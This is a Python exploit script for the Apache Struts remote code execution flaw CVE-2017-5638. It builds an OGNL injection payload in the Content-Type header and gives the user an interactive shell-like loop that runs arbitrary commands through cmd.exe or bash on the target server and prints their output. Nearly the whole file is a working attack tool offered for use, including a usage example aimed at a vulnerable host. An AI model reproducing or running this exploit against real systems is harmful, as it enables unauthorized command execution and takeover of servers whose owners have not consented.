#!/usr/bin/python
#
# Apache Struts RCE exploiter CVE-2017-5638, shell-like experience

import os
import sys
import base64
import socket
import urllib
import requests

def runStruts(cmd, URL, PROXY):

  payload = "%{(#_='multipart/form-data')."
  payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
  payload += "(#_memberAccess?"
  payload += "(#_memberAccess=#dm):"
  payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
  payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
  payload += "(#ognlUtil.getExcludedPackageNames().clear())."
  payload += "(#ognlUtil.getExcludedClasses().clear())."
  payload += "(#context.setMemberAccess(#dm))))."
  payload += "(#cmd='%s')." % cmd
  payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
  payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
  payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
  payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
  payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
  payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
  payload += "(#ros.flush())}"

  # dee bug
  # print(payload)

  # For some reason it started working when piped through Burp proxy
  proxies={}
  if (PROXY != None):
    proxies = {
      'http': PROXY
    }

  # print("gonna run some struts now..")
  headerz = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
  try:
    r = requests.get(URL, headers=headerz, proxies=proxies)
    print("-------------------------------- DA REPLY --------")
    print(r.text)
  except requests.exceptions.ChunkedEncodingError, e:
    pass


# USE LIKE: python strutser.py http://vulnerable.legacy.sys/Monitoring.action http://127.0.0.1:8510
URL = sys.argv[1]
print("URL: " + URL)
proxy = None
if (len(sys.argv) > 2):
  proxy = sys.argv[2]
  print("PROXY URL: " + proxy)
while True:
  try:
    cmd = raw_input('>> ')
  except EOFError:
    break
  runStruts(cmd, URL, proxy)
